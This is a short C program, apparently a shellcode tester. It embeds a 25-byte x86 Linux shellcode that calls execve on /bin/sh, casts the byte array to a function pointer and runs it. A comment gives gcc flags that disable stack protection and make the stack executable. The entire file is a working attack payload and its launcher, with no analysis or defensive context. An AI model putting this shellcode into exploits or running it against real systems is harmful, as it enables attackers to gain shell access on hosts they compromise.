#include<stdio.h>
#include<string.h>

//c Compile with gcc -fno-stack-protector -z execstack shellcode.c -o shellcode

unsigned char code[] = \
"\x31\xdb\xf7\xe3\x31\xc9\xeb\x05\x5b\xb0\x0b\xcd\x80\xe8\xf6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
